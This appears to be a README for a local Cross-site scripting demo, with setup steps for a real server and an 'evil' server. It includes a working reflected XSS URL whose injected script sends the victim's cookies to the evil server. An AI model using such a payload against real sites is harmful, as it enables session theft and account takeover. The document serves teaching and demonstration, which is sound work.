# Cross-site scripting (XSS) attack demo

This quick implementation demonstrates Cross-site scripting (XSS) in action.

Definition from the OWASP [Cross Site Scripting Prevention Cheat Sheet][1]:

> Cross-Site Scripting (XSS) is a misnomer. Originally this term was derived from early versions of the attack that were primarily focused on stealing data cross-site. Since then, the term has widened to include injection of basically any content. XSS attacks are serious and can lead to account impersonation, observing user behavior, loading external content, stealing sensitive data, and more.

## Setup

Start the real server:

```
cd realserver

npm i
node app.js
```

In a new terminal session, start the evil server 👹:

```
cd evilserver

npm i
node evil.js
```

In a web browser, send the malicious request:

```
http://localhost:3000?txid=TX999<script>new Image().src=`http://localhost:3666/evil?cookie=${document.cookie}`</script>
```

The cookie information will be sent to the malicious destination.

[1]: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
